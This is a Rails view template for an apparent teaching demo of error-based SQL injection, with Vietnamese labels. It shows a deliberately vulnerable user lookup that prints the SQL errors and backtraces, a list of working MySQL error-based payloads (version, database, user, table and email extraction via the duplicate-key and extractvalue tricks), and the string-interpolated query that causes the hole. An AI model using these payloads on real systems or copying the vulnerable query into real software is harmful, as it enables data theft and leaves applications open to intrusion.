<div class="container mt-4">
  <h2>Error-based SQL Injection Demo</h2>
  <div class="alert alert-danger">
    <strong>Nguy hiểm:</strong> Lỗi database có thể lộ thông tin nhạy cảm!
  </div>

  <div class="row">
    <div class="col-md-6">
      <h4>User Lookup (Vulnerable)</h4>
      <%= form_with url: sqli_error_based_demo_path, method: :get, local: true, class: "border p-3 bg-light" do |f| %>
        <div class="mb-3">
          <%= f.label :user_id, "User ID:", class: "form-label" %>
          <%= f.text_field :user_id, class: "form-control", 
                          placeholder: "Thử: 1 AND (SELECT * FROM information_schema.tables)" %>
        </div>
        <%= f.submit "Search User", class: "btn btn-primary" %>
      <% end %>
      
      <% if defined?(@users) %>
        <div class="mt-3">
          <h5>Kết quả:</h5>
          <% if @users&.any? %>
            <% @users.each do |user| %>
              <div class="alert alert-info">
                <strong>User:</strong> <%= user.email %><br>
                <strong>Role:</strong> <%= user.role %>
              </div>
            <% end %>
          <% end %>
        </div>
      <% end %>
      
      <% if @sql_query %>
        <div class="mt-3">
          <h5>SQL Query thực thi:</h5>
          <pre class="bg-secondary text-light p-2"><%= @sql_query %></pre>
        </div>
      <% end %>
      
      <% if @error_details %>
        <div class="mt-3">
          <h5>Chi tiết lỗi (THÔNG TIN NHẠY CẢM!):</h5>
          <div class="alert alert-danger">
            <strong>Error Message:</strong><br>
            <code><%= @error_details[:message] %></code><br><br>
            
            <strong>SQL State:</strong> <%= @error_details[:sql_state] %><br>
            <strong>Error Number:</strong> <%= @error_details[:error_number] %><br>
            
            <% if @error_details[:backtrace] %>
              <br><strong>Backtrace:</strong><br>
              <% @error_details[:backtrace].each do |line| %>
                <small><%= line %></small><br>
              <% end %>
            <% end %>
          </div>
        </div>
      <% end %>
    </div>
    
    <div class="col-md-6">
            <h4>Error-based Payloads:</h4>
      <div class="list-group">
        <div class="list-group-item">
          <strong>Lỗi cú pháp cơ bản:</strong><br>
          <code>1'</code>
        </div>
        
        <div class="list-group-item">
          <strong>Lấy version DB:</strong><br>
          <code>1 AND (SELECT @@version)</code>
        </div>
        
        <div class="list-group-item">
          <strong>Lấy tên database:</strong><br>
          <code>1 AND (SELECT database())</code>
        </div>
        
        <div class="list-group-item">
          <strong>Lấy user hiện tại:</strong><br>
          <code>1 AND (SELECT user())</code>
        </div>
        
        <div class="list-group-item">
          <strong>Lấy tên bảng:</strong><br>
          <code>1 AND (SELECT table_name FROM information_schema.tables LIMIT 1)</code>
        </div>
        
        <div class="list-group-item">
          <strong>Extract user email:</strong><br>
          <code>1 AND (SELECT email FROM users WHERE id=1)</code>
        </div>
        
        <div class="list-group-item">
          <strong>Duplicate key error (MySQL):</strong><br>
          <code>1 AND (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)</code>
        </div>
        
        <div class="list-group-item">
          <strong>Convert error (lấy data):</strong><br>
          <code>1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT email FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</code>
        </div>
        
        <div class="list-group-item">
          <strong>XML error (MySQL):</strong><br>
          <code>1 AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))</code>
        </div>
      </div>
    </div>
  </div>
  
  <div class="mt-4">
    <h4>Code vulnerable:</h4>
    <pre class="bg-dark text-light p-3"><code>user_id = params[:user_id]
sql = "SELECT * FROM users WHERE id = #{user_id}"
@users = User.find_by_sql(sql)</code></pre>
  </div>
  
  <div class="mt-3 alert alert-info">
    <strong>Cách hoạt động:</strong>
    <ul>
      <li>Inject SQL query làm phát sinh lỗi</li>
      <li>Database trả về thông báo lỗi chi tiết</li>
      <li>Thông báo lỗi chứa thông tin nhạy cảm</li>
      <li>Hacker thu thập thông tin từ error messages</li>
    </ul>
  </div>
</div>
